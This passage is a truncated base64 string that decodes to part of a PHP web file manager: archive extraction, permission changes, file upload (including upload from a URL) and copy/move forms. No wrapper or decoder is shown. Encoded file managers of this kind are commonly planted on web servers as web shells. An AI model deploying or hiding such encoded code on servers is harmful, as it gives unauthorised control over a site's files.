CAgICAgIGZtX3NldF9tc2coJ09wZXJhdGlvbnMgd2l0aCBhcmNoaXZlcyBhcmUgbm90IGF2YWlsYWJsZScsICdlcnJvcicpOwogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwogICAgfQoKICAgIGlmICgkaXNWYWxpZCkgewogICAgICAgIC8vdG8gZm9sZGVyCiAgICAgICAgJHRvZm9sZGVyID0gJyc7CiAgICAgICAgaWYgKGlzc2V0KCRfR0VUWyd0b2ZvbGRlciddKSkgewogICAgICAgICAgICAkdG9mb2xkZXIgPSBwYXRoaW5mbygkemlwX3BhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKICAgICAgICAgICAgaWYgKGZtX21rZGlyKCRwYXRoIC4gJy8nIC4gJHRvZm9sZGVyLCB0cnVlKSkgewogICAgICAgICAgICAgICAgJHBhdGggLj0gJy8nIC4gJHRvZm9sZGVyOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZigkZXh0ID09ICJ6aXAiKSB7CiAgICAgICAgICAgICR6aXBwZXIgPSBuZXcgRk1fWmlwcGVyKCk7CiAgICAgICAgICAgICRyZXMgPSAkemlwcGVyLT51bnppcCgkemlwX3BhdGgsICRwYXRoKTsKICAgICAgICB9IGVsc2VpZiAoJGV4dCA9PSAidGFyIikgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJGd6aXBwZXIgPSBuZXcgUGhhckRhdGEoJHppcF9wYXRoKTsKICAgICAgICAgICAgICAgIGlmIChAJGd6aXBwZXItPmV4dHJhY3RUbygkcGF0aCxudWxsLCB0cnVlKSkgewogICAgICAgICAgICAgICAgICAgICRyZXMgPSB0cnVlOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcmVzID0gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgICAgICAgICAgICAgLy9UT0RPOjogbmVlZCB0byBoYW5kbGUgdGhlIGVycm9yCiAgICAgICAgICAgICAgICAkcmVzID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRyZXMpIHsKICAgICAgICAgICAgZm1fc2V0X21zZygnQXJjaGl2ZSB1bnBhY2tlZCcpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZtX3NldF9tc2coJ0FyY2hpdmUgbm90IHVucGFja2VkJywgJ2Vycm9yJyk7CiAgICAgICAgfQoKICAgIH0gZWxzZSB7CiAgICAgICAgZm1fc2V0X21zZygnRmlsZSBub3QgZm91bmQnLCAnZXJyb3InKTsKICAgIH0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwp9CgovLyBDaGFuZ2UgUGVybXMgKG5vdCBmb3IgV2luZG93cykKaWYgKGlzc2V0KCRfUE9TVFsnY2htb2QnXSkgJiYgIUZNX1JFQURPTkxZICYmICFGTV9JU19XSU4pIHsKICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgaWYgKEZNX1BBVEggIT0gJycpIHsKICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwogICAgfQoKICAgICRmaWxlID0gJF9QT1NUWydjaG1vZCddOwogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsKICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOwogICAgaWYgKCRmaWxlID09ICcnIHx8ICghaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSAmJiAhaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSkgewogICAgICAgIGZtX3NldF9tc2coJ0ZpbGUgbm90IGZvdW5kJywgJ2Vycm9yJyk7CiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSk7CiAgICB9CgogICAgJG1vZGUgPSAwOwogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3VyJ10pKSB7CiAgICAgICAgJG1vZGUgfD0gMDQwMDsKICAgIH0KICAgIGlmICghZW1wdHkoJF9QT1NUWyd1dyddKSkgewogICAgICAgICRtb2RlIHw9IDAyMDA7CiAgICB9CiAgICBpZiAoIWVtcHR5KCRfUE9TVFsndXgnXSkpIHsKICAgICAgICAkbW9kZSB8PSAwMTAwOwogICAgfQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ2dyJ10pKSB7CiAgICAgICAgJG1vZGUgfD0gMDA0MDsKICAgIH0KICAgIGlmICghZW1wdHkoJF9QT1NUWydndyddKSkgewogICAgICAgICRtb2RlIHw9IDAwMjA7CiAgICB9CiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnZ3gnXSkpIHsKICAgICAgICAkbW9kZSB8PSAwMDEwOwogICAgfQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ29yJ10pKSB7CiAgICAgICAgJG1vZGUgfD0gMDAwNDsKICAgIH0KICAgIGlmICghZW1wdHkoJF9QT1NUWydvdyddKSkgewogICAgICAgICRtb2RlIHw9IDAwMDI7CiAgICB9CiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnb3gnXSkpIHsKICAgICAgICAkbW9kZSB8PSAwMDAxOwogICAgfQoKICAgIGlmIChAY2htb2QoJHBhdGggLiAnLycgLiAkZmlsZSwgJG1vZGUpKSB7CiAgICAgICAgZm1fc2V0X21zZygnUGVybWlzc2lvbnMgY2hhbmdlZCcpOwogICAgfSBlbHNlIHsKICAgICAgICBmbV9zZXRfbXNnKCdQZXJtaXNzaW9ucyBub3QgY2hhbmdlZCcsICdlcnJvcicpOwogICAgfQoKICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwp9CgovKioqKioqKioqKioqKioqKioqKioqKioqKioqIC9BQ1RJT05TICoqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8vIGdldCBjdXJyZW50IHBhdGgKJHBhdGggPSBGTV9ST09UX1BBVEg7CmlmIChGTV9QQVRIICE9ICcnKSB7CiAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwp9CgovLyBjaGVjayBwYXRoCmlmICghaXNfZGlyKCRwYXRoKSkgewogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9Jyk7Cn0KCi8vIGdldCBwYXJlbnQgZm9sZGVyCiRwYXJlbnQgPSBmbV9nZXRfcGFyZW50X3BhdGgoRk1fUEFUSCk7Cgokb2JqZWN0cyA9IGlzX3JlYWRhYmxlKCRwYXRoKSA/IHNjYW5kaXIoJHBhdGgpIDogYXJyYXkoKTsKJGZvbGRlcnMgPSBhcnJheSgpOwokZmlsZXMgPSBhcnJheSgpOwokY3VycmVudF9wYXRoID0gYXJyYXlfc2xpY2UoZXhwbG9kZSgiLyIsJHBhdGgpLCAtMSlbMF07CmlmIChpc19hcnJheSgkb2JqZWN0cykgJiYgZm1faXNfZXhjbHVkZV9pdGVtcygkY3VycmVudF9wYXRoKSkgewogICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGZpbGUpIHsKICAgICAgICBpZiAoJGZpbGUgPT0gJy4nIHx8ICRmaWxlID09ICcuLicpIHsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGlmICghRk1fU0hPV19ISURERU4gJiYgc3Vic3RyKCRmaWxlLCAwLCAxKSA9PT0gJy4nKSB7CiAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KICAgICAgICAkbmV3X3BhdGggPSAkcGF0aCAuICcvJyAuICRmaWxlOwogICAgICAgIGlmIChAaXNfZmlsZSgkbmV3X3BhdGgpICYmIGZtX2lzX2V4Y2x1ZGVfaXRlbXMoJGZpbGUpKSB7CiAgICAgICAgICAgICRmaWxlc1tdID0gJGZpbGU7CiAgICAgICAgfSBlbHNlaWYgKEBpc19kaXIoJG5ld19wYXRoKSAmJiAkZmlsZSAhPSAnLicgJiYgJGZpbGUgIT0gJy4uJyAmJiBmbV9pc19leGNsdWRlX2l0ZW1zKCRmaWxlKSkgewogICAgICAgICAgICAkZm9sZGVyc1tdID0gJGZpbGU7CiAgICAgICAgfQogICAgfQp9CgppZiAoIWVtcHR5KCRmaWxlcykpIHsKICAgIG5hdGNhc2Vzb3J0KCRmaWxlcyk7Cn0KaWYgKCFlbXB0eSgkZm9sZGVycykpIHsKICAgIG5hdGNhc2Vzb3J0KCRmb2xkZXJzKTsKfQoKLy8gdXBsb2FkIGZvcm0KaWYgKGlzc2V0KCRfR0VUWyd1cGxvYWQnXSkgJiYgIUZNX1JFQURPTkxZKSB7CiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVIKICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aAogICAgLy9nZXQgdGhlIGFsbG93ZWQgZmlsZSBleHRlbnNpb25zCiAgICBmdW5jdGlvbiBnZXRVcGxvYWRFeHQoKSB7CiAgICAgICAgJGV4dEFyciA9IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKTsKICAgICAgICBpZihGTV9VUExPQURfRVhURU5TSU9OICYmICRleHRBcnIpIHsKICAgICAgICAgICAgYXJyYXlfd2FsaygkZXh0QXJyLCBmdW5jdGlvbigmJHgpIHskeCA9ICIuJHgiO30pOwogICAgICAgICAgICByZXR1cm4gaW1wbG9kZSgnLCcsICRleHRBcnIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJyc7CiAgICB9CiAgICA/PgoKICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2Ryb3B6b25lLzUuNS4xL21pbi9kcm9wem9uZS5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiPgogICAgPGRpdiBjbGFzcz0icGF0aCI+CgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiBmbS11cGxvYWQtd3JhcHBlciA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2IG5hdi10YWJzIGNhcmQtaGVhZGVyLXRhYnMiPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIiBocmVmPSIjZmlsZVVwbG9hZGVyIiBkYXRhLXRhcmdldD0iI2ZpbGVVcGxvYWRlciI+PGkgY2xhc3M9ImZhIGZhLWFycm93LWNpcmNsZS1vLXVwIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdVcGxvYWRpbmdGaWxlcycpID8+PC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iI3VybFVwbG9hZGVyIiBjbGFzcz0ianMtdXJsLXVwbG9hZCIgZGF0YS10YXJnZXQ9IiN1cmxVcGxvYWRlciI+PGkgY2xhc3M9ImZhIGZhLWxpbmsiPjwvaT4gVXBsb2FkIGZyb20gVVJMPC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJjYXJkLXRleHQiPgogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gRk1fUEFUSCA/PiIgY2xhc3M9ImZsb2F0LXJpZ2h0Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCBnby1iYWNrIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrJyk/PjwvYT4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnRGVzdGluYXRpb25Gb2xkZXInKSA/PjogPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUk9PVF9QQVRIIC4gJy8nIC4gRk1fUEFUSCkpID8+CiAgICAgICAgICAgICAgICA8L3A+CgogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoRk1fU0VMRl9VUkwpIC4gJz9wPScgLiBmbV9lbmMoRk1fUEFUSCkgPz4iIGNsYXNzPSJkcm9wem9uZSBjYXJkLXRhYnMtY29udGFpbmVyIiBpZD0iZmlsZVVwbG9hZGVyIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4iPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZ1bGxwYXRoIiBpZD0iZnVsbHBhdGgiIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9QQVRIKSA/PiI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmFsbGJhY2siPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0iZmlsZSIgdHlwZT0iZmlsZSIgbXVsdGlwbGUvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InVwbG9hZC11cmwtd3JhcHBlciBjYXJkLXRhYnMtY29udGFpbmVyIGhpZGRlbiIgaWQ9InVybFVwbG9hZGVyIj4KICAgICAgICAgICAgICAgICAgICA8Zm9ybSBpZD0ianMtZm9ybS11cmwtdXBsb2FkIiBjbGFzcz0iZm9ybS1pbmxpbmUiIG9uc3VibWl0PSJyZXR1cm4gdXBsb2FkX2Zyb21fdXJsKHRoaXMpOyIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJ1cGxvYWQiIGFyaWEtbGFiZWw9ImhpZGRlbiIgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idXJsIiBwbGFjZWhvbGRlcj0iVVJMIiBuYW1lPSJ1cGxvYWR1cmwiIHJlcXVpcmVkIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJ3aWR0aDogODAlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbWwtMyI+PD9waHAgZWNobyBsbmcoJ1VwbG9hZCcpID8+PC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imxkcy1mYWNlYm9vayI+PGRpdj48L2Rpdj48ZGl2PjwvZGl2PjxkaXY+PC9kaXY+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImpzLXVybC11cGxvYWRfX2xpc3QiIGNsYXNzPSJjb2wtOSBtdC0zIj48L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2Ryb3B6b25lLzUuNS4xL21pbi9kcm9wem9uZS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdD4KICAgICAgICBEcm9wem9uZS5vcHRpb25zLmZpbGVVcGxvYWRlciA9IHsKICAgICAgICAgICAgdGltZW91dDogMTIwMDAwLAogICAgICAgICAgICBtYXhGaWxlc2l6ZTogPD9waHAgZWNobyBNQVhfVVBMT0FEX1NJWkU7ID8+LAogICAgICAgICAgICBhY2NlcHRlZEZpbGVzIDogIjw/cGhwIGVjaG8gZ2V0VXBsb2FkRXh0KCkgPz4iLAogICAgICAgICAgICBpbml0OiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICB0aGlzLm9uKCJzZW5kaW5nIiwgZnVuY3Rpb24gKGZpbGUsIHhociwgZm9ybURhdGEpIHsKICAgICAgICAgICAgICAgICAgICBsZXQgX3BhdGggPSAoZmlsZS5mdWxsUGF0aCkgPyBmaWxlLmZ1bGxQYXRoIDogZmlsZS5uYW1lOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmdWxscGF0aCIpLnZhbHVlID0gX3BhdGg7CiAgICAgICAgICAgICAgICAgICAgeGhyLm9udGltZW91dCA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoJ0Vycm9yOiBTZXJ2ZXIgVGltZW91dCcpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSkub24oInN1Y2Nlc3MiLCBmdW5jdGlvbiAocmVzKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IF9yZXNwb25zZSA9IEpTT04ucGFyc2UocmVzLnhoci5yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgaWYoX3Jlc3BvbnNlLnN0YXR1cyA9PSAiZXJyb3IiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KF9yZXNwb25zZS5pbmZvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KS5vbigiZXJyb3IiLCBmdW5jdGlvbihmaWxlLCByZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgIHRvYXN0KHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zY3JpcHQ+CiAgICA8P3BocAogICAgZm1fc2hvd19mb290ZXIoKTsKICAgIGV4aXQ7Cn0KCi8vIGNvcHkgZm9ybSBQT1NUCmlmIChpc3NldCgkX1BPU1RbJ2NvcHknXSkgJiYgIUZNX1JFQURPTkxZKSB7CiAgICAkY29weV9maWxlcyA9IGlzc2V0KCRfUE9TVFsnZmlsZSddKSA/ICRfUE9TVFsnZmlsZSddIDogbnVsbDsKICAgIGlmICghaXNfYXJyYXkoJGNvcHlfZmlsZXMpIHx8IGVtcHR5KCRjb3B5X2ZpbGVzKSkgewogICAgICAgIGZtX3NldF9tc2coJ05vdGhpbmcgc2VsZWN0ZWQnLCAnYWxlcnQnKTsKICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgIH0KCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVIKICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aAogICAgPz4KICAgIDxkaXYgY2xhc3M9InBhdGgiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+CiAgICAgICAgICAgICAgICA8aDY+PD9waHAgZWNobyBsbmcoJ0NvcHlpbmcnKSA/PjwvaDY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaW5pc2giIHZhbHVlPSIxIj4KICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRjb3B5X2ZpbGVzIGFzICRjZikgewogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlW10iIHZhbHVlPSInIC4gZm1fZW5jKCRjZikgLiAnIj4nIC4gUEhQX0VPTDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgPz4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+PD9waHAgZWNobyBsbmcoJ0ZpbGVzJykgPz46IDxiPjw/cGhwIGVjaG8gaW1wbG9kZSgnPC9iPiwgPGI+JywgJGNvcHlfZmlsZXMpID8+PC9iPjwvcD4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+PD9waHAgZWNobyBsbmcoJ1NvdXJjZUZvbGRlcicpID8+OiA8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbihGTV9ST09UX1BBVEggLiAnLycgLiBGTV9QQVRIKSkgPz48YnI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImlucF9jb3B5X3RvIj48P3BocCBlY2hvIGxuZygnRGVzdGluYXRpb25Gb2xkZXInKSA/Pjo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIEZNX1JPT1RfUEFUSCA/Pi88aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29weV90byIgaWQ9ImlucF9jb3B5X3RvIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4iPgogICAgICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94IGN1c3RvbS1jb250cm9sIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im1vdmUiIHZhbHVlPSIxIiBpZD0ianMtbW92ZS1maWxlcyIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0Ij48bGFiZWwgZm9yPSJqcy1tb3ZlLWZpbGVzIiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogc3ViIj4gPD9waHAgZWNobyBsbmcoJ01vdmUnKSA/PjwvbGFiZWw+PC9wPgogICAgICAgICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ29weScpID8+PC9idXR0b24+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5Ij48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYT48L2I+CiAgICAgICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAKICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICBleGl0Owp9CgovLyBjb3B5IGZvcm0KaWYgKGlzc2V0KCRfR0VUWydjb3B5J10pICYmICFpc3NldCgkX0dFVFsnZmluaXNoJ10pICYmICFGTV9SRUFET05MWSkgewogICAgJGNvcHkgPSAkX0dFVFsnY29weSddOwogICAgJGNvcHkgPSBmbV9jbGVhbl9wYXRoKCRjb3B5KTsKICAgIGlmICgkY29weSA9PSAnJyB8fCAhZmlsZV9leGlzdHMoRk1fUk9PVF9QQVRIIC4gJy8nIC4gJGNvcHkpKSB7CiAgICAgICAgZm1fc2V0X21zZygnRmlsZSBub3QgZm91bmQnLCAnZXJyb3InKTsKICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgIH0KCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVIKICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aAogICAgPz4KICAgIDxkaXYgY2xhc3M9InBhdGgiPgogICAgICAgIDxwPjxiPkNvcHlpbmc8L2I+PC9wPgogICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj4KICAgICAgICAgICAgU291cmNlIHBhdGg6IDw/cGhwIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKEZNX1JPT1RfUEFUSCAuICcvJyAuICRjb3B5KSkgPz48YnI+CiAgICAgICAgICAgIERlc3RpbmF0aW9uIGZvbGRlcjogPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUk9PVF9QQVRIIC4gJy8nIC4gRk1fUEFUSCkpID8+CiAgICAgICAgPC9wPgogICAgICAgIDxwPgogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSgkY29weSkgPz4mYW1wO2ZpbmlzaD0xIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IENvcHk8L2E+PC9iPiAmbmJzcDsKICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+JmFtcDtmaW5pc2g9MSZhbXA7bW92ZT0xIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IE1vdmU8L2E+PC9iPiAmbmJzcDsKICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4iPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUiPjwvaT4gQ2FuY2VsPC9hPjwvYj4KICAgICAgICA8L3A+CiAgICAgICAgPHA+PGk+U2VsZWN0IGZvbGRlcjwvaT48L3A+CiAgICAgICAgPHVsIGNsYXNzPSJmb2xkZXJzIGJyZWFrLXdvcmQiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICA8bGk+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhcmVudCkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCI+PC9pPiAuLjwvYT48L2xpPgogICAgICAgICAgICAgICAgPD9waHAKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoICgkZm9sZGVycyBhcyAkZikgewogICAgICAgICAgICAgICAgPz4KICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+Ij48aSBjbGFzcz0iZmEgZmEtZm9sZGVyLW8iPjwvaT4gPD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbigkZikgPz48L2E+PC9saT4KICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgPz4KICAgICAgICA8L3VsPgogICAgPC9kaXY+CiAgICA8P3BocAogICAgZm1fc2hvd19mb290ZXIoKTsKICAgIGV4aXQ7Cn0KCmlmIChpc3NldCgkX0dFVFsnc2V0dGluZ3MnXSkgJiYgIUZNX1JFQURPTkxZKSB7CiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVIKICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aAogICAgZ2xvYmFsICRjZmcsICRsYW5nLCAkbGFuZ19saXN0OwogICAgPz4KCiAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtOCBvZmZzZXQtbWQtMiBwdC0zIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1